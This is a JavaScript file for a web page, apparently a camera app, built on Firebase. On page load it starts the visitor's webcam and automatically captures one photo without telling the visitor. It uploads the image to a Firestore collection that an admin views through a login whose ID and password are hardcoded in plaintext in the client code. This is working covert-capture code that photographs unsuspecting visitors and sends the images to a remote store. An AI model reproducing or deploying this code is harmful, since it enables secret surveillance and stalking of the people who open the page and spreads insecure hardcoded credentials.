import { auth, db } from "./firebase.js";
import { signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
import { collection, addDoc, serverTimestamp, query, orderBy, onSnapshot } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

const ADMIN_ID = "8521574912";
const ADMIN_PASSWORD = "rituraj@123";
const LOGIN_KEY = "admin_logged_in";
const STORAGE_ADMIN_ID = "8521574912";

const statusMessage = document.getElementById("status-message");
const errorBox = document.getElementById("error-box");
const errorText = document.getElementById("error-text");
const loginGate = document.getElementById("login-gate");
const dashboardView = document.getElementById("dashboard-view");
const imagesGrid = document.getElementById("images-grid");

const adminIdInput = document.getElementById("admin-id");
const adminPasswordInput = document.getElementById("admin-password");
const loginButton = document.getElementById("login-button");

const videoEl = document.getElementById("camera-stream");
const captureButton = document.getElementById("capture-button");

let userId = null;
let hasAutoCaptured = false;

signInAnonymously(auth).then(() => {
  userId = auth.currentUser?.uid || "anonymous";
  status("विज़िटर ऑथ सफल।");
  startCamera();
}).catch(err => showError("Auth विफल: " + err.message));

loginButton.addEventListener("click", () => {
  if (adminIdInput.value === ADMIN_ID && adminPasswordInput.value === ADMIN_PASSWORD) {
    sessionStorage.setItem(LOGIN_KEY, "true");
    loginGate.classList.add("hidden");
    dashboardView.classList.remove("hidden");
    status("एडमिन लॉगिन सफल।");
    subscribePhotos();
  } else {
    showError("गलत ID/पासवर्ड");
  }
});

captureButton.addEventListener("click", async () => {
  await captureAndSave();
});

async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    videoEl.srcObject = stream;
    videoEl.onloadedmetadata = () => {
      videoEl.play();
      autoCaptureOnce();
    };
  } catch (err) {
    showError("कैमरा एक्सेस विफल: " + err.message);
  }
}

async function autoCaptureOnce() {
  if (hasAutoCaptured) return;
  hasAutoCaptured = true;
  await captureAndSave();
}

async function captureAndSave() {
  try {
    const canvas = document.createElement("canvas");
    canvas.width = videoEl.videoWidth;
    canvas.height = videoEl.videoHeight;
    canvas.getContext("2d").drawImage(videoEl, 0, 0);
    const base64Image = canvas.toDataURL("image/jpeg", 0.8);

    const photosRef = collection(db, "artifacts", "gcam-app", "users", STORAGE_ADMIN_ID, "captured_photos");
    await addDoc(photosRef, {
      base64Image,
      timestamp: serverTimestamp(),
      capturedBy: userId,
      capturedAt: new Date().toLocaleString("hi-IN")
    });

    status("✅ फोटो सेव हो गई।");
  } catch (err) {
    showError("सेव विफल: " + err.message);
  }
}

function subscribePhotos() {
  const photosRef = collection(db, "artifacts", "gcam-app", "users", STORAGE_ADMIN_ID, "captured_photos");
  const q = query(photosRef, orderBy("timestamp", "desc"));
  onSnapshot(q, snap => {
    imagesGrid.innerHTML = "";
    snap.forEach(doc => {
      const data = doc.data();
      const img = document.createElement("img");
      img.src = data.base64Image;
      img.className = "w-full h-40 object-cover border";
      imagesGrid.appendChild(img);
    });
  });
}

function status(msg) { statusMessage.textContent = msg; }
function showError(msg) { errorText.textContent = msg; errorBox.classList.remove("hidden"); }
window.closeErrorBox = () => errorBox.classList.add("hidden");
